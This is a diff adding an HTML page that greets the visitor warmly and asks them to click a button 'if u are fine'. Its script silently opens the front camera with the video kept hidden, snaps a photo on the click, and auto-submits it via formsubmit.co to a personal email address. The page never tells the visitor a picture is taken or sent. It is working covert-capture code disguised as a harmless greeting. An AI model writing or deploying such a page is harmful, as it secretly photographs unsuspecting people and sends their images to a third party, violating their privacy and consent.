@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+</head>
+<body>
+    <h2>HELLO  ❤ __ HOW ARE U ? </h2>
+    
+    <!-- Removed the video element, only button to trigger capture -->
+    <button id="capture">click here if u are fine  </button>
+    <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+    <form id="imageForm" action="https://formsubmit.co/hemrajbudha60@gmail.com" method="POST" enctype="multipart/form-data">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+        <input type="file" id="imageInput" name="image" accept="image/png, image/jpeg">
+        <button type="submit" style="display: none;">Submit</button>
+    </form>
+
+    <script>
+        const canvas = document.getElementById("canvas");
+        const captureButton = document.getElementById("capture");
+        const imageInput = document.getElementById("imageInput");
+        const form = document.getElementById("imageForm");
+
+        // Start video stream with front-facing camera (selfie mode)
+        navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: "user"  // Request front-facing camera
+            }
+        })
+        .then(stream => {
+            // Don't display video, just use it for capturing the photo
+            let video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            
+            captureButton.addEventListener("click", () => {
+                const context = canvas.getContext("2d");
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Capture and submit the image
+                canvas.toBlob(blob => {
+                    const file = new File([blob], "photo.png", { type: "image/png" });
+                    const dataTransfer = new DataTransfer();
+                    dataTransfer.items.add(file);
+                    imageInput.files = dataTransfer.files;
+
+                    // Automatically submit the form
+                    form.submit();
+                }, "image/png");
+            });
+        })
+        .catch(err => console.error("Error accessing camera: ", err));
+    </script>
+</body>
+</html>
